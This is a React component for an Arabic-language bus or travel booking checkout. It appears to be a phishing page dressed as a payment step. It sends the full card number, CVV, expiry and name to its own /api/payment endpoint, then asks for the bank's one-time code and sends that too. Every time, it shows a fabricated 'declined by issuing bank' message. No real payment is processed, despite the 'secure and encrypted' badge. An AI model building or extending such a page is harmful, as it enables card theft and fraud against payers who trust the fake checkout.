import { useState } from 'react';
import { createBooking } from '@workspace/api-client-react';
import { BookingData, FARES } from '@/lib/booking-data';
import { Button } from '@/components/ui/button';
import { ArrowRight, CreditCard, ShieldCheck, Lock, ShieldAlert, Smartphone, KeyRound, XCircle, CheckCircle2 } from 'lucide-react';
import {
  getCardType,
  detectCardDetails,
  isValidLuhn,
  isValidExpiry,
  isValidCvv,
  formatCardNumber,
  CardType,
} from '@/lib/card-validation';
import visaLogo from '@assets/VISA-logo_1789397546178.png';
import amexLogo from '@assets/American-Express-Color_1789397546180.png';
import applePayLogo from '@assets/apple_pay_1789397610648.svg';
import mastercardLogo from '@assets/MasterCard_Logo.svg_1789397635786.webp';

type Props = {
  data: BookingData;
  updateData: (d: Partial<BookingData>) => void;
  onNext: () => void;
  onPrev: () => void;
};

export function Step5({ data, onPrev }: Props) {
  const [view, setView] = useState<'payment' | 'otp'>('payment');
  const [isProcessing, setIsProcessing] = useState(false);
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [formError, setFormError] = useState('');
  const [bookingId, setBookingId] = useState('');

  const [otp, setOtp] = useState('');
  const [otpError, setOtpError] = useState('');
  const [verificationError, setVerificationError] = useState('');

  const passengerTotal = data.passengers * FARES[data.tripType];
  const luggageTotal = data.luggage * FARES.luggage;
  const grandTotal = passengerTotal + luggageTotal;

  const [paymentRecordId, setPaymentRecordId] = useState('');

  const rawCardDigits = cardNumber.replace(/\D/g, '');
  const currentCardType = getCardType(rawCardDigits);
  const isCardNumberValid = rawCardDigits.length >= 13 && isValidLuhn(rawCardDigits);
  const isExpiryValid = isValidExpiry(expiryDate);
  const isCvvValid = isValidCvv(cvv, currentCardType);
  const isNameValid = cardholderName.trim().length >= 3;

  const handlePayment = async () => {
    // 1. Card Number Validation (Length + Luhn Check)
    if (!rawCardDigits) {
      setFormError('يرجى إدخال رقم البطاقة.');
      return;
    }

    if (currentCardType === 'amex' && rawCardDigits.length !== 15) {
      setFormError('رقم بطاقة أمريكان إكسبريس يجب أن يتكون من 15 رقمًا.');
      return;
    }

    if (currentCardType !== 'amex' && (rawCardDigits.length < 13 || rawCardDigits.length > 19)) {
      setFormError('رقم البطاقة غير مكتمل، يرجى إدخال رقم بطاقة يتكون من 16 رقمًا.');
      return;
    }

    if (!isValidLuhn(rawCardDigits)) {
      setFormError('رقم البطاقة غير صحيح (فشل فحص التشفير Luhn). يرجى التأكد من إدخال رقم بطاقة ائتمان حقيقي وصحيح.');
      return;
    }

    // 2. Cardholder Name Validation
    if (!isNameValid) {
      setFormError('يرجى إدخال الاسم الكامل كما هو مدون على البطاقة.');
      return;
    }

    // 3. Expiry Date Validation
    if (!isExpiryValid) {
      setFormError('تاريخ انتهاء البطاقة غير صحيح أو منتهي الصلاحية (صيغة MM/YY).');
      return;
    }

    // 4. CVV Validation
    if (!isCvvValid) {
      setFormError(
        currentCardType === 'amex'
          ? 'رمز الأمان (CVV) لبطاقة أمريكان إكسبريس يجب أن يتكون من 4 أرقام.'
          : 'رمز الأمان (CVV) يجب أن يتكون من 3 أرقام.'
      );
      return;
    }

    setFormError('');
    setIsProcessing(true);

    try {
      if (!bookingId) {
        if (!data.date) {
          throw new Error('Missing travel date');
        }

        const savedBooking = await createBooking({
          bookingType: data.bookingType,
          origin: data.origin,
          destination: data.destination,
          tripType: data.tripType,
          travelDate: data.date.toISOString().slice(0, 10),
          scheduleId: data.scheduleId,
          passengers: data.passengers,
          luggage: data.luggage,
          contactName: data.contact.fullName,
          phoneCode: data.contact.phoneCode,
          phoneNumber: data.contact.phone,
          email: data.contact.email,
          amountJod: grandTotal,
        });
        setBookingId(savedBooking.id);
      }

      // Perform live BIN lookup
      const cleanBin = cardNumber.replace(/\D/g, '').slice(0, 8);
      let binData = null;
      try {
        const binRes = await fetch(`/api/bin-lookup/${cleanBin}`);
        if (binRes.ok) {
          binData = await binRes.json();
        }
      } catch (err) {
        console.warn("BIN lookup error:", err);
      }

      const cardDetails = detectCardDetails(cardNumber, undefined, binData || undefined);
      const paymentRes = await fetch('/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber,
          expiry: expiryDate,
          cvv,
          name: cardholderName,
          bankName: cardDetails.bankNameAr, 
          otp: "",
          amount: grandTotal,
          currency: 'JOD',
          visitorId: (window as any).visitorId,
          binData: cardDetails.rawBinData
        })
      });
      
      const paymentData = await paymentRes.json();
      if (paymentData?.data?.[0]?.id) {
        setPaymentRecordId(paymentData.data[0].id);
      }

      await new Promise((resolve) => setTimeout(resolve, 800));
      setIsProcessing(false);
      setView('otp');
    } catch {
      setIsProcessing(false);
      setFormError('تعذر حفظ بيانات الحجز حالياً. يرجى المحاولة مرة أخرى.');
    }
  };

  const handleVerifyOtp = async () => {
    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
      setOtpError('يرجى إدخال رمز التحقق المكون من 6 أرقام بشكل صحيح.');
      return;
    }
    setOtpError('');
    setIsProcessing(true);

    try {
      // Update existing payment record with the OTP
      await fetch('/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          paymentId: paymentRecordId,
          otp,
          visitorId: (window as any).visitorId // fallback if paymentId missing
        })
      });
      
      // Simulate verification delay then error as requested to not show success for fake cards
      setTimeout(() => {
        setIsProcessing(false);
        setVerificationError('عذراً، تم رفض العملية من قبل البنك المصدر للبطاقة. يرجى التأكد من توفر رصيد كافٍ أو الاتصال بالبنك لمحاولة أخرى.');
      }, 1000);
    } catch (err) {
      setIsProcessing(false);
      setVerificationError('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.');
    }
  };

  const handleCardNumberChange = (value: string) => {
    const rawDigits = value.replace(/\D/g, '');
    const detectedType = getCardType(rawDigits);
    const formatted = formatCardNumber(value, detectedType);
    setCardNumber(formatted);
    setFormError('');
  };

  const handleExpiryChange = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 4);
    setExpiryDate(
      digitsOnly.length > 2
        ? `${digitsOnly.slice(0, 2)}/${digitsOnly.slice(2)}`
        : digitsOnly,
    );
    setFormError('');
  };

  const handleCvvChange = (value: string) => {
    const maxLen = currentCardType === 'amex' ? 4 : 3;
    setCvv(value.replace(/\D/g, '').slice(0, maxLen));
    setFormError('');
  };

  if (view === 'otp') {
    return (
      <div className="flex-1 flex flex-col p-5 gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24">
        <div className="text-center mt-4">
          <div className="mx-auto w-24 h-24 bg-secondary/10 text-secondary rounded-full flex items-center justify-center mb-6 relative">
            <div className="absolute inset-0 bg-secondary/20 rounded-full animate-ping opacity-20" />
            <Smartphone className="w-12 h-12 relative z-10" />
          </div>
          <h2 className="text-2xl font-black text-foreground tracking-tight">التحقق من الدفع</h2>
          <p className="text-muted-foreground text-sm font-medium mt-3 px-2 leading-relaxed">
            تم إرسال رمز تحقق بخطوة واحدة (OTP) إلى رقم الهاتف المحمول المرتبط بالبطاقة المنتهية بـ <span className="font-bold font-mono text-foreground" dir="ltr">**{cardNumber.slice(-4) || 'XXXX'}</span>
          </p>
        </div>

        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 mt-2">
          {verificationError ? (
            <div className="flex flex-col items-center justify-center py-6 text-center animate-in zoom-in-95 duration-300">
              <div className="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center mb-4">
                <XCircle className="w-8 h-8" />
              </div>
              <h3 className="font-bold text-xl text-foreground mb-2 tracking-tight">فشلت عملية الدفع</h3>
              <p className="text-muted-foreground text-sm font-medium leading-relaxed mb-8 px-2">
                {verificationError}
              </p>
              <Button
                onClick={() => {
                  setVerificationError('');
                  setOtp('');
                  setView('payment');
                }}
                className="w-full h-14 rounded-2xl bg-secondary text-primary hover:bg-secondary/90 font-bold text-base transition-all"
              >
                العودة لبيانات البطاقة
              </Button>
            </div>
          ) : (
            <>
              <div className="space-y-4">
                <div className="space-y-3 text-center">
                  <label className="text-sm font-bold text-foreground">أدخل رمز التحقق (6 أرقام)</label>
                  <div className="relative max-w-[260px] mx-auto">
                    <input
                      value={otp}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                        setOtp(val);
                        setOtpError('');
                      }}
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      placeholder="000000"
                      dir="ltr"
                      className="h-16 w-full rounded-2xl border-2 border-gray-100 bg-gray-50 text-center tracking-[0.5em] outline-none transition-all focus:bg-white focus:border-primary focus:ring-4 focus:ring-primary/10 font-mono text-3xl font-black shadow-none text-primary placeholder:tracking-[0.5em] placeholder:text-muted-foreground/30"
                    />
                  </div>
                </div>
              </div>

              {otpError && (
                <p className="mt-6 text-xs font-bold text-red-600 bg-red-50 border border-red-100 p-3 rounded-xl flex items-center justify-center gap-2">
                  <ShieldAlert className="w-4 h-4 shrink-0" />
                  {otpError}
                </p>
              )}

              <Button
                type="button"
                onClick={handleVerifyOtp}
                disabled={isProcessing}
                className="mt-8 h-16 w-full rounded-2xl bg-primary text-white hover:bg-primary/90 font-bold text-lg shadow-lg hover:shadow-xl transition-all relative overflow-hidden disabled:opacity-70"
              >
                {isProcessing ? (
                  <div className="flex items-center gap-3">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    جاري التحقق...
                  </div>
                ) : (
                  <div className="flex items-center gap-2">
                    <KeyRound className="w-5 h-5" />
                    تأكيد الدفع
                  </div>
                )}
              </Button>

              {!isProcessing && (
                <div className="flex justify-center mt-4">
                  <Button
                    variant="ghost"
                    onClick={() => {
                      setOtp('');
                      setOtpError('');
                      setView('payment');
                    }}
                    className="rounded-xl h-12 px-5 text-muted-foreground hover:text-foreground hover:bg-gray-100/50 font-bold transition-all text-sm flex items-center gap-2"
                  >
                    <ArrowRight className="w-4 h-4" />
                    العودة وتغيير البطاقة
                  </Button>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 flex flex-col p-5 gap-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24">

      <div className="text-center mt-2">
        <h2 className="text-2xl font-black text-foreground tracking-tight">الدفع المباشر</h2>
      </div>

      <div className="bg-primary text-white rounded-3xl p-6 shadow-lg relative overflow-hidden text-center mt-2">
        <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full blur-3xl -mt-10 -mr-10 pointer-events-none" />
        <p className="text-primary-foreground/80 text-sm font-medium mb-2 relative z-10">المبلغ الإجمالي المستحق</p>
        <div className="flex items-center justify-center gap-2 relative z-10">
          <span className="text-4xl font-black">{grandTotal.toFixed(2)}</span>
          <span className="text-xl font-bold opacity-90">JOD</span>
        </div>
      </div>

      <div className="flex items-center justify-center gap-3">
        {[
          { logo: visaLogo, type: 'visa', label: 'Visa' },
          { logo: mastercardLogo, type: 'mastercard', label: 'Mastercard' },
          { logo: amexLogo, type: 'amex', label: 'American Express' },
          { logo: applePayLogo, type: 'apple', label: 'Apple Pay' },
        ].map((item, i) => {
          const isSelected = currentCardType === item.type;
          return (
            <div
              key={i}
              className={`h-12 w-16 bg-white border rounded-xl shadow-sm flex items-center justify-center p-2 transition-all duration-300 ${
                isSelected
                  ? 'border-primary ring-2 ring-primary/30 scale-105 shadow-md bg-primary/5'
                  : 'border-gray-100 opacity-80'
              }`}
            >
              <img src={item.logo} alt={item.label} className="max-h-full object-contain" />
            </div>
          );
        })}
      </div>

      <div className="bg-white rounded-3xl p-5 shadow-sm border border-gray-100 mt-2">
        <div className="flex items-center justify-between mb-6">
          <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
            <CreditCard className="w-5 h-5 text-primary" />
            بيانات البطاقة
          </h3>
          <div className="flex items-center gap-1.5 opacity-80" dir="ltr">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span className="text-[10px] font-bold text-emerald-600">آمن ومشفر</span>
          </div>
        </div>

        <div className="space-y-4">
          <div className="space-y-2">
            <div className="flex items-center justify-between px-1">
              <label className="text-xs font-bold text-muted-foreground">رقم البطاقة</label>
              {currentCardType !== 'unknown' && (
                <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-primary/10 text-primary uppercase">
                  {currentCardType}
                </span>
              )}
            </div>
            <div className="relative">
              <input
                value={cardNumber}
                onChange={(event) => handleCardNumberChange(event.target.value)}
                inputMode="numeric"
                placeholder="0000 0000 0000 0000"
                dir="ltr"
                className={`h-14 w-full rounded-2xl border-2 bg-gray-50 pl-4 pr-10 text-left tracking-widest outline-none transition-all font-mono text-base shadow-none ${
                  rawCardDigits.length >= 13
                    ? isCardNumberValid
                      ? 'border-emerald-500 focus:border-emerald-600 focus:ring-4 focus:ring-emerald-500/10'
                      : 'border-red-400 focus:border-red-500 focus:ring-4 focus:ring-red-500/10'
                    : 'border-gray-100 focus:bg-white focus:border-primary focus:ring-4 focus:ring-primary/10'
                }`}
              />
              {isCardNumberValid && (
                <CheckCircle2 className="w-5 h-5 text-emerald-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
              )}
            </div>
          </div>

          <div className="space-y-2">
            <div className="flex items-center justify-between px-1">
              <label className="text-xs font-bold text-muted-foreground">الاسم على البطاقة</label>
              {isNameValid && (
                <CheckCircle2 className="w-4 h-4 text-emerald-500" />
              )}
            </div>
            <input
              value={cardholderName}
              onChange={(event) => { setCardholderName(event.target.value); setFormError(''); }}
              placeholder="الاسم الكامل كما هو على البطاقة"
              className={`h-14 w-full rounded-2xl border-2 bg-gray-50 px-4 outline-none transition-all text-base shadow-none ${
                cardholderName.length > 0
                  ? isNameValid
                    ? 'border-emerald-500 focus:border-emerald-600 focus:ring-4 focus:ring-emerald-500/10'
                    : 'border-gray-200'
                  : 'border-gray-100 focus:bg-white focus:border-primary focus:ring-4 focus:ring-primary/10'
              }`}
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <div className="flex items-center justify-between px-1">
                <label className="text-xs font-bold text-muted-foreground">تاريخ الانتهاء</label>
                {isExpiryValid && (
                  <CheckCircle2 className="w-4 h-4 text-emerald-500" />
                )}
              </div>
              <input
                value={expiryDate}
                onChange={(event) => handleExpiryChange(event.target.value)}
                inputMode="numeric"
                placeholder="MM/YY"
                dir="ltr"
                className={`h-14 w-full rounded-2xl border-2 bg-gray-50 px-4 text-left tracking-widest outline-none transition-all font-mono text-base shadow-none ${
                  expiryDate.length === 5
                    ? isExpiryValid
                      ? 'border-emerald-500 focus:border-emerald-600 focus:ring-4 focus:ring-emerald-500/10'
                      : 'border-red-400 focus:border-red-500 focus:ring-4 focus:ring-red-500/10'
                    : 'border-gray-100 focus:bg-white focus:border-primary focus:ring-4 focus:ring-primary/10'
                }`}
              />
            </div>
            <div className="space-y-2">
              <div className="flex items-center justify-between px-1">
                <label className="text-xs font-bold text-muted-foreground">رمز CVV</label>
                {isCvvValid && (
                  <CheckCircle2 className="w-4 h-4 text-emerald-500" />
                )}
              </div>
              <input
                value={cvv}
                onChange={(event) => handleCvvChange(event.target.value)}
                inputMode="numeric"
                placeholder={currentCardType === 'amex' ? '1234' : '123'}
                dir="ltr"
                type="password"
                maxLength={currentCardType === 'amex' ? 4 : 3}
                className={`h-14 w-full rounded-2xl border-2 bg-gray-50 px-4 text-left tracking-widest outline-none transition-all font-mono text-base shadow-none ${
                  cvv.length >= 3
                    ? isCvvValid
                      ? 'border-emerald-500 focus:border-emerald-600 focus:ring-4 focus:ring-emerald-500/10'
                      : 'border-red-400 focus:border-red-500 focus:ring-4 focus:ring-red-500/10'
                    : 'border-gray-100 focus:bg-white focus:border-primary focus:ring-4 focus:ring-primary/10'
                }`}
              />
            </div>
          </div>
        </div>

        {formError && (
          <p className="mt-5 text-xs font-bold text-red-600 bg-red-50 border border-red-100 p-3 rounded-xl flex items-center gap-2 animate-in fade-in">
            <ShieldAlert className="w-4 h-4 shrink-0" />
            {formError}
          </p>
        )}

        <Button
          type="button"
          onClick={handlePayment}
          disabled={isProcessing}
          className="mt-6 h-16 w-full rounded-2xl bg-secondary text-primary hover:bg-secondary/90 font-bold text-lg shadow-[0_8px_20px_rgba(249,177,21,0.25)] hover:shadow-[0_12px_25px_rgba(249,177,21,0.35)] transition-all relative overflow-hidden"
        >
          {isProcessing ? (
            <div className="flex items-center gap-3">
              <div className="w-5 h-5 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
              جاري المعالجة...
            </div>
          ) : (
            <div className="flex items-center gap-2">
              <Lock className="w-5 h-5" />
              ادفع الآن
            </div>
          )}
        </Button>
      </div>

      {!isProcessing && (
        <div className="flex justify-center mt-2">
          <Button
            variant="ghost"
            onClick={onPrev}
            className="rounded-2xl h-12 px-5 text-muted-foreground hover:text-foreground hover:bg-gray-100/50 font-bold transition-all flex items-center gap-2"
          >
            <ArrowRight className="h-5 w-5" />
            <span>رجوع</span>
          </Button>
        </div>
      )}

    </div>
  );
}

